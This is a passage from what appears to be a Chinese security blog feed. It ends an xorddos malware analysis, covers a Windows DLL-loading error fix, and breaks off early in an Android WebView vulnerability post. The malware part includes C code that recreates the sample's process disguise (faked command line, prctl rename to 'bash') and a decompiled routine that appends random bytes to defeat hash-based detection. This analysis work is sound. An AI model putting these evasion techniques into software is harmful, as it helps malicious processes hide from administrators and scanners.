[ebp+var_18]<br>.text:<span class="hljs-number">0804B5D6</span>                 mov     [esp+<span class="hljs-number">4</span>], eax<br>.text:<span class="hljs-number">0804B5DA</span>                 lea     eax, [ebp+self_path]<br>.text:<span class="hljs-number">0804B5E0</span>                 mov     [esp], eax<br>.text:<span class="hljs-number">0804B5E3</span>                 call    readfile<br>.text:<span class="hljs-number">0804B5E8</span>                 mov     edx, [ebp+argv_arr]<br>.text:<span class="hljs-number">0804B5EE</span>                 mov     ebx, [edx+<span class="hljs-number">4</span>]<br>.text:<span class="hljs-number">0804B5F1</span>                 mov     [ebp+self_file_content], eax<br>.text:<span class="hljs-number">0804B5F7</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B5FA</span>                 call    strlen<br>.text:<span class="hljs-number">0804B5FF</span>                 mov     [esp+<span class="hljs-number">4</span>], ebx<br>.text:<span class="hljs-number">0804B603</span>                 mov     [esp+<span class="hljs-number">8</span>], eax<br>.text:<span class="hljs-number">0804B607</span>                 lea     eax, [ebp+fake_cmd]<br>.text:<span class="hljs-number">0804B60D</span>                 mov     [esp], eax<br>.text:<span class="hljs-number">0804B610</span>                 call    memmove<br>.text:<span class="hljs-number">0804B615</span>                 mov     dword ptr [esp+<span class="hljs-number">0Ch</span>], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B61D</span>                 mov     dword ptr [esp+<span class="hljs-number">8</span>], <span class="hljs-number">0Ah</span><br>.text:<span class="hljs-number">0804B625</span>                 mov     dword ptr [esp+<span class="hljs-number">4</span>], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B62D</span>                 mov     edx, [ebp+argv_arr]<br>.text:<span class="hljs-number">0804B633</span>                 mov     eax, [edx+<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">0804B636</span>                 mov     [esp], eax<br>.text:<span class="hljs-number">0804B639</span>                 call    __strtol_internal<br>.text:<span class="hljs-number">0804B63E</span>                 mov     esi, eax<br>.text:<span class="hljs-number">0804B640</span>                 mov     eax, [ebp+argv_arr]<br>.text:<span class="hljs-number">0804B646</span>                 mov     ebx, [eax]<br>.text:<span class="hljs-number">0804B648</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B64B</span>                 call    strlen<br>.text:<span class="hljs-number">0804B650</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B653</span>                 mov     dword ptr [esp+<span class="hljs-number">4</span>], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B65B</span>                 mov     [esp+<span class="hljs-number">8</span>], eax<br>.text:<span class="hljs-number">0804B65F</span>                 call    memset<br>.text:<span class="hljs-number">0804B664</span>                 mov     edx, [ebp+argv_arr]<br>.text:<span class="hljs-number">0804B66A</span>                 mov     ebx, [edx+<span class="hljs-number">4</span>]<br>.text:<span class="hljs-number">0804B66D</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B670</span>                 call    strlen<br>.text:<span class="hljs-number">0804B675</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B678</span>                 mov     dword ptr [esp+<span class="hljs-number">4</span>], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B680</span>                 mov     [esp+<span class="hljs-number">8</span>], eax<br>.text:<span class="hljs-number">0804B684</span>                 call    memset<br>.text:<span class="hljs-number">0804B689</span>                 mov     eax, [ebp+argv_arr]<br>.text:<span class="hljs-number">0804B68F</span>                 mov     ebx, [eax+<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">0804B692</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B695</span>                 call    strlen<br>.text:<span class="hljs-number">0804B69A</span>                 mov     [esp], ebx<br>.text:<span class="hljs-number">0804B69D</span>                 mov     dword ptr [esp+<span class="hljs-number">4</span>], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B6A5</span>                 mov     [esp+<span class="hljs-number">8</span>], eax<br>.text:<span class="hljs-number">0804B6A9</span>                 call    memset<br>.text:<span class="hljs-number">0804B6AE</span>                 lea     edx, [ebp+fake_cmd]<br>.text:<span class="hljs-number">0804B6B4</span>                 mov     [esp+<span class="hljs-number">4</span>], edx<br>.text:<span class="hljs-number">0804B6B8</span>                 mov     edx, [ebp+argv_arr]<br>.text:<span class="hljs-number">0804B6BE</span>                 mov     eax, [edx]<br>.text:<span class="hljs-number">0804B6C0</span>                 mov     [esp], eax<br>.text:<span class="hljs-number">0804B6C3</span>                 call    strcpy<br>.text:<span class="hljs-number">0804B6C8</span>                 lea     eax, [ebp+filename]<br>.text:<span class="hljs-number">0804B6CE</span>                 mov     [esp+<span class="hljs-number">0Ch</span>], esi<br>.text:<span class="hljs-number">0804B6D2</span>                 lea     esi, [ebp+randstr_10]<br></code></pre></td></tr></table></figure><p>上面代码的原理大致等同于下面这段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>&#123;<br>    <span class="hljs-type">char</span> fake_cmd[<span class="hljs-number">256</span>];<br>    <span class="hljs-built_in">memset</span>(&amp;fake_cmd, <span class="hljs-number">0</span>, <span class="hljs-number">256</span>);<br>    <span class="hljs-type">char</span> * argv_arr_1 = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">int</span> argv_arr_1_length = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>    memmove(&amp;fake_cmd, argv_arr_1, argv_arr_1_length);<br>    <span class="hljs-type">long</span> pid_long = strtol(argv[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br>    <span class="hljs-type">char</span> * v29 = (<span class="hljs-type">char</span> *)*argv;<br>    <span class="hljs-type">int</span> v30 = <span class="hljs-built_in">strlen</span>(*argv);<br>    <span class="hljs-built_in">memset</span>(v29, <span class="hljs-number">0</span>, v30);<br>    <span class="hljs-type">char</span> * v31 = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">int</span> v32 = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">memset</span>(v31, <span class="hljs-number">0</span>, v32);<br>    <span class="hljs-type">char</span> * v33 = argv[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> v34 = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">memset</span>(v33, <span class="hljs-number">0</span>, v34);<br>    <span class="hljs-built_in">strcpy</span>(*argv, fake_cmd);<br>    sleep(<span class="hljs-number">300</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译后执行可以看到效果和运行样本的一样。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  ~ gcc -o fakeexe exe.c<br>➜  ~ ./fakeexe <span class="hljs-string">&quot;ls -al&quot;</span> 2554<br><br>➜  ~ <span class="hljs-built_in">cat</span> /proc/2605/cmdline<br><span class="hljs-built_in">ls</span> -al<br><br>➜  ~ <span class="hljs-built_in">ls</span> -l /proc/2605/exe<br>lrwxrwxrwx. 1 henices henices 0 8月   2 12:01 /proc/2605/exe -&gt; /home/henices/research/xorddos/fakeexe<br><br>➜  ~ ps -elf | grep <span class="hljs-string">&quot;ls -al&quot;</span> | grep -v grep<br>0 S henices   2605 25307  0  80   0 -  1043 hrtime 12:01 pts/5    00:00:00 <span class="hljs-built_in">ls</span> -al<br></code></pre></td></tr></table></figure><p>其实效果并不好，可以轻易发现踪迹。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  ~ <span class="hljs-keyword">ps</span> -<span class="hljs-keyword">e</span> | <span class="hljs-keyword">grep</span> fakeexe<br> <span class="hljs-number">2605</span> <span class="hljs-keyword">pts</span>/<span class="hljs-number">9</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> fakeexe<br><br></code></pre></td></tr></table></figure><p>其实有更好的做法，使用 prctl ，至少可以把ps给搞定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>&#123;<br>    <span class="hljs-type">char</span> fake_cmd[<span class="hljs-number">256</span>];<br>    <span class="hljs-built_in">memset</span>(&amp;fake_cmd, <span class="hljs-number">0</span>, <span class="hljs-number">256</span>);<br>    <span class="hljs-type">char</span> * argv_arr_1 = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">int</span> argv_arr_1_length = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>    memmove(&amp;fake_cmd, argv_arr_1, argv_arr_1_length);<br>    <span class="hljs-type">long</span> pid_long = strtol(argv[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br>    <span class="hljs-type">char</span> * v29 = (<span class="hljs-type">char</span> *)*argv;<br>    <span class="hljs-type">int</span> v30 = <span class="hljs-built_in">strlen</span>(*argv);<br>    <span class="hljs-built_in">memset</span>(v29, <span class="hljs-number">0</span>, v30);<br>    <span class="hljs-type">char</span> * v31 = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">int</span> v32 = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">memset</span>(v31, <span class="hljs-number">0</span>, v32);<br>    <span class="hljs-type">char</span> * v33 = argv[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> v34 = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">memset</span>(v33, <span class="hljs-number">0</span>, v34);<br>    <span class="hljs-built_in">strcpy</span>(*argv, fake_cmd);<br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;bash&quot;</span>);<br>    sleep(<span class="hljs-number">300</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译执行后可以看到效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  ~ ps -e | grep bash<br> 4858 pts/5    00:00:00 bash<br><br>➜  ~ <span class="hljs-built_in">cat</span> /proc/4858/cmdline <br><span class="hljs-built_in">ls</span> -al<br><br>➜  ~ lsof -d txt | grep fakeexe<br>bash       4858 henices txt       REG  253,2      8816  4588423 /home/henices/research/xorddos/fakeexe<br></code></pre></td></tr></table></figure><h2 id="xorddos-的多态-（Polymorphic）"><a href="#xorddos-的多态-（Polymorphic）" class="headerlink" title="xorddos 的多态 （Polymorphic）"></a>xorddos 的多态 （Polymorphic）</h2><p>xorddos这个样本还值得一提的是，这个样本会不断变化，多态这个词翻译的可能不太准确，<br>可以参见上面的英文，自行理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">randmd5</span><span class="hljs-params">(<span class="hljs-type">char</span> *filename)</span><br>&#123;<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// eax@1</span><br>  <span class="hljs-type">int</span> fd_dup; <span class="hljs-comment">// esi@1</span><br>  <span class="hljs-type">mode_t</span> v4; <span class="hljs-comment">// [sp+8h] [bp-20h]@0</span><br>  <span class="hljs-type">int</span> addr; <span class="hljs-comment">// [sp+15h] [bp-13h]@1</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [sp+19h] [bp-Fh]@1</span><br>  __int16 v7; <span class="hljs-comment">// [sp+1Dh] [bp-Bh]@1</span><br>  <span class="hljs-type">char</span> v8; <span class="hljs-comment">// [sp+1Fh] [bp-9h]@1</span><br><br>  addr = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  v7 = <span class="hljs-number">0</span>;<br>  v8 = <span class="hljs-number">0</span>;<br>  fd = open(filename, <span class="hljs-number">1</span>, v4);<br>  fd_dup = fd;<br>  <span class="hljs-keyword">if</span> ( fd &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    lseek(fd, <span class="hljs-number">0</span>, SEEK_END);<br>    randstr((<span class="hljs-type">int</span>)&amp;addr, <span class="hljs-number">10</span>);<br>    write(fd_dup, &amp;addr, <span class="hljs-number">11u</span>);<br>    close(fd_dup);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>xorddos 样本多态主要就是用这个函数，每次在文件末尾写上10个字节的随机字符。<br>这样样本md5和大小都会发生变化，使得一些检测方法失效。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>正因为这种隐藏方法并不理想，后面xorddos出现了带rootkit的版本，进化了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决 Windows Rx034</title>
    <link href="/cn/Windows_Rx034/"/>
    <url>/cn/Windows_Rx034/</url>
    
    <content type="html"><![CDATA[<p>以前没有遇上这个错误，这次遇上这个错误是装vim的YouCompleteMe插件后出现，因此很容易想到是装插件引起的这个错误，错误提示Runtime Error 如下图：</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/r5051.png" alt="error"></p><p>先放狗搜一下，微软的对R6034的解释如下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">An application has made <span class="hljs-keyword">an</span> attempt <span class="hljs-built_in">to</span> <span class="hljs-built_in">load</span> <span class="hljs-keyword">the</span> C runtime library <span class="hljs-keyword">without</span> <span class="hljs-keyword">using</span><br><span class="hljs-keyword">a</span> manifest. This is <span class="hljs-keyword">an</span> unsupported way <span class="hljs-built_in">to</span> <span class="hljs-built_in">load</span> Visual C++ DLLs. You need <span class="hljs-built_in">to</span><br>modify your application <span class="hljs-built_in">to</span> build <span class="hljs-keyword">with</span> <span class="hljs-keyword">a</span> manifest. For more information, see <span class="hljs-keyword">the</span><br><span class="hljs-string">&quot;Visual C++ Libraries as Shared Side-by-Side Assemblies&quot;</span> topic <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> product<br>documentation.<br></code></pre></td></tr></table></figure><p>微软的链接中也提到了解决的方法</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Rebuild your application <span class="hljs-built_in">to</span> <span class="hljs-built_in">include</span> <span class="hljs-keyword">a</span> manifest. Building <span class="hljs-keyword">an</span> application <span class="hljs-keyword">with</span><br>Visual Studio automatically puts <span class="hljs-keyword">the</span> manifest <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> resulting .exe <span class="hljs-keyword">or</span> .dll<br><span class="hljs-built_in">file</span>. If you are building <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">command</span> <span class="hljs-title">line</span>, <span class="hljs-title">use</span> <span class="hljs-title">the</span> <span class="hljs-title">mt</span>.<span class="hljs-title">exe</span> <span class="hljs-title">tool</span> <span class="hljs-title">to</span> <span class="hljs-title">add</span> <span class="hljs-title">the</span><br>manifest <span class="hljs-keyword">as</span> <span class="hljs-keyword">a</span> resource. Use resource ID <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> you build <span class="hljs-keyword">an</span> .exe, <span class="hljs-keyword">and</span> resource<br>ID <span class="hljs-number">2</span> <span class="hljs-keyword">if</span> you build <span class="hljs-keyword">a</span> .dll. For more information, see How <span class="hljs-built_in">to</span>: Embed <span class="hljs-keyword">a</span> Manifest<br>Inside <span class="hljs-keyword">a</span> C/C++ Application.<br></code></pre></td></tr></table></figure><p>大概的意思是需要使用manifest.xml来指定需要加载的DLL。上网又翻看了几个链接发现这个错误的成因比较复杂，主要原因是加载mscvr*.dll 出现了问题。不管怎样还是先看看是否使用了 manifest。从微软的解决办法可以知道，manifest很有可能在资源文件里。</p><p>还是先看看manifest的作用，在msdn网站搜索相关内容，根据《Understanding Manifest Generation for C&#x2F;C++ Programs》中的内容，manfest.xml可以是一个外部的XML文件也可以是嵌入在程序的资源文件中。manifest.xml用于管理程序在运行时需要的共享程序集的名字和版本。如果程序只依赖 VisualC++ 的程序集（CRT，MFC，ATL等），manifest会被链接器自动生成。Manifest的Sxs指定了其依赖的清单名称,版本,资源,和其他组件。Sxs是Windows XP引入的新技术，vs 2005 开始使用，全名叫Side by Side assembly，主要还是为了解决兼容性问题，这样同一个系统可以存在不同版本的同名文件而互相不影响各自的运行。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/sxs.png" alt="sxs"></p><p>现在需要定位gvim.exe加载哪个DLL引起了R6034错误，使用Process Explorer发现是加载ycm_client_support.pyd导致。删除YouCompleteMe插件后错误消失。</p><p>先看看ycm_client_support.pyd是否使用了manifest.xml, 使用神器TC,  F3一下，可以查看manifest的情况。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/manifest.png" alt="manifest.xml"></p><p>发现其实ycm_client_support.pyd已经使用了manifest，但是仍然出现R6034错误。上网搜索了一番（见文末的参考链接），发现这就是非常著名的DLL Hell了，维基百科中专门记录了这个问题。 <a href="http://en.wikipedia.org/wiki/Dll_hell">http://en.wikipedia.org/wiki/Dll_hell</a></p><p>不论如何应该就是DLL加载时出错了，可以使用Process Explorer 工具来查看出问题的进程，看看在进程空间内具体是什么情况。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer.png" alt="p-e"></p><p>哈哈，发现了一些情况，msvcr90.dll在gvim进程空间里有两个！再看看这两个DLL的位置。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer1.png" alt="p-e1"></p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer2.png" alt="p-e2"></p><p>删除掉不在C:\WINDOWS\WinSxS\目录里的msvcr90.dll，问题得以解决。由于这个错误是因为加载ycm_client_support.pyd引起的，再看看ycm_client_support.pyd的情况，拿出TC直接F3一下，又发现了一些有用的信息。ycm_client_support.pyd加载的是cmake目录下的msvcr90.dll, 正常情况下因该使用 C:\Windows\winsxs 目录下的msvcr90.dll</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/tc1.png" alt="tc1"></p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/tc2.png" alt="tc2"></p><p>查看一下系统环境变量：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livescript">D:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Microsoft</span> Visual Studio <span class="hljs-number">9.0</span><span class="hljs-string">\VC&gt;</span> set | findstr Path<br><br>Path=D:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Microsoft</span> Visual Studio <span class="hljs-number">9.0</span><span class="hljs-string">\Common7\IDE;D:\Program</span> Files<span class="hljs-string">\M</span><br>icrosoft Visual Studio <span class="hljs-number">9.0</span><span class="hljs-string">\VC\BIN;D:\Program</span> Files<span class="hljs-string">\Microsoft</span> Visual Studio <span class="hljs-number">9.0</span><span class="hljs-string">\C</span><br>ommon7<span class="hljs-string">\Tools;c:\Windows\Microsoft.NET\Framework\v3.5;c:\Windows\Microsoft.NET\Fr</span><br>amework<span class="hljs-string">\v2.0.50727;D:\Program</span> Files<span class="hljs-string">\Microsoft</span> Visual Studio <span class="hljs-number">9.0</span><span class="hljs-string">\VC\VCPackages;C:</span><br><span class="hljs-string">\Program</span> Files<span class="hljs-string">\\Microsoft</span> SDKs<span class="hljs-string">\Windows\v6.0A\bin;C:\Windows\system32;C:\Windows;</span><br>d:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\CMake</span> <span class="hljs-number">2.8</span><span class="hljs-string">\bin;d:\Program</span> Files<span class="hljs-string">\LLVM</span> <span class="hljs-number">3.4</span>.svn<span class="hljs-string">\bin;d:\Program</span> File<br>s<span class="hljs-string">\Git\cmd;d:\Python27;D:\Program</span> Files<span class="hljs-string">\IDM</span> Computer Solutions<span class="hljs-string">\UltraEdit\</span><br>PSModulePath=C:<span class="hljs-string">\Windows\system32\WindowsPowerShell\v1.0\Modules\</span><br></code></pre></td></tr></table></figure><p>引错误的原因是Windows程序加载DLL是会先加载PATH变量中的DLL文件，后面会加载manifest指定的WinSxS目录的文件，这样就加载了两次，引起了错误。</p><p>这个问题涉及 Windows加载DLL文件的顺序，Windows定位 DLL文件的顺序和一个注册表键值相关，这个键值是：</p><p><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code></p><p>SafeDllSearchMode的值为1，开启SafeDllSearchMode，<br>SafeDllSearchMode的值为0，禁用SafeDllSearchMode。</p><p>Windows系统默认开启SafeDllSearchMode （Windows XP SP2 后），MSDN文章《Dynamic-Link Library Search Order》中指出，在SafeDllSearchMode开启的情况下，Windows定位DLL文件的顺序为：</p><ol><li>The directory from which the application loaded.</li><li>The system directory. ( GetSystemDirectory )</li><li>The 16-bit system directory.</li><li>The Windows directory. (GetWindowsDirectory )</li><li>The current directory.</li><li>The directories that are listed in the PATH environment variable.</li></ol><p>在SafeDllSearchMode关闭的情况下，Windows定位DLL文件的顺序为：</p><ol><li>The directory from which the application loaded.</li><li>The current directory.</li><li>The system directory. (GetSystemDirectory )</li><li>The 16-bit system directory.</li><li>The Windows directory. ( GetWindowsDirectory)</li><li>The directories that are listed in the PATH environment variable.</li></ol><p>另外，《Dynamic-Link Library Search Order》中指出使用manifest可以指定加载DLL的路径，但实际的情况是有可能加载多个DLL导致进程崩溃。</p><p>Desktop applications can control the location from which a DLL is loaded by specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, the system searches for the DLL at load time as described in this section.</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1]《Windows via C&#x2F;C++ Fifth Edition》<br>[2] Side-by-side Assemblies <a href="http://msdn.microsoft.com/en-us/library/aa376307.aspx">http://msdn.microsoft.com/en-us/library/aa376307.aspx</a><br>[3] DLL Hell <a href="http://en.wikipedia.org/wiki/Dll_hell">http://en.wikipedia.org/wiki/Dll_hell</a><br>[4] C Run-Time Error R6034 <a href="http://msdn.microsoft.com/en-us/library/ms235560(v=vs.90).aspx">http://msdn.microsoft.com/en-us/library/ms235560(v=vs.90).aspx</a><br>[5] Understanding Manifest Generation for C&#x2F;C++ Programs <a href="http://msdn.microsoft.com/en-us/library/ms235542.aspx">http://msdn.microsoft.com/en-us/library/ms235542.aspx</a><br>[6] Search Path Used by Windows to Locate a DLL <a href="http://msdn.microsoft.com/en-us/library/7d83bc18.aspx">http://msdn.microsoft.com/en-us/library/7d83bc18.aspx</a><br>[7] Dynamic-Link Library Search Order <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a><br>[8] <a href="https://bitbucket.org/Haroogan/vim-youcompleteme-for-windows/src/7dca764c2ee0?at=master">https://bitbucket.org/Haroogan/vim-youcompleteme-for-windows/src/7dca764c2ee0?at=master</a><br>[9] <a href="https://github.com/Valloric/YouCompleteMe/wiki/Windows-Installation-Guide">https://github.com/Valloric/YouCompleteMe/wiki/Windows-Installation-Guide</a><br>[10] <a href="http://www.davidlenihan.com/2007/07/winsxs.html">http://www.davidlenihan.com/2007/07/winsxs.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android WebView 漏洞</title>
    <link href="/cn/webview_java/"/>
    <url>/cn/webview_java/</url>
    
    <content type="html"><![CDATA[<h2 id="☆-来自-developer-android-com-的信息"><a href="#☆-来自-developer-android-com-的信息" class="headerlink" title="☆ 来自 developer.android.com 的信息"></a>☆ 来自 developer.android.com 的信息</h2><p>Android 官方网站对addJavascriptInterface的介绍如下：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">public</span> void addJavascriptInterface (<span class="hljs-type">Object</span> <span class="hljs-type">object</span>, <span class="hljs-type">String</span> name)  Added <span class="hljs-keyword">in</span> API level <span class="hljs-number">1</span><br><br>Injects the supplied Java <span class="hljs-type">object</span> <span class="hljs-keyword">into</span> this WebView. The <span class="hljs-type">object</span> <span class="hljs-built_in">is</span> injected <span class="hljs-keyword">into</span><br>the JavaScript context <span class="hljs-keyword">of</span> the main frame, <span class="hljs-keyword">using</span> the supplied name. This allows <br>the Java <span class="hljs-type">object</span><span class="hljs-comment">&#x27;s methods to be accessed from JavaScript. For applications</span><br>targeted <span class="hljs-keyword">to</span> API level JELLY_BEAN_MR1 <span class="hljs-built_in">and</span> above, only <span class="hljs-keyword">public</span> methods that are <br>annotated <span class="hljs-keyword">with</span> JavascriptInterface can be accessed <span class="hljs-keyword">from</span> JavaScript. <span class="hljs-keyword">For</span> applications<br>targeted <span class="hljs-keyword">to</span> API level JELLY_BEAN <span class="hljs-built_in">or</span> below, all <span class="hljs-keyword">public</span> methods (including the inherited ones)<br>can be accessed, see the important security note below <span class="hljs-keyword">for</span> implications.<br><br>Note that injected objects will <span class="hljs-built_in">not</span> appear <span class="hljs-keyword">in</span> JavaScript <span class="hljs-keyword">until</span> the page <span class="hljs-built_in">is</span> <span class="hljs-keyword">next</span><br>(re)loaded. <span class="hljs-keyword">For</span> example:<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 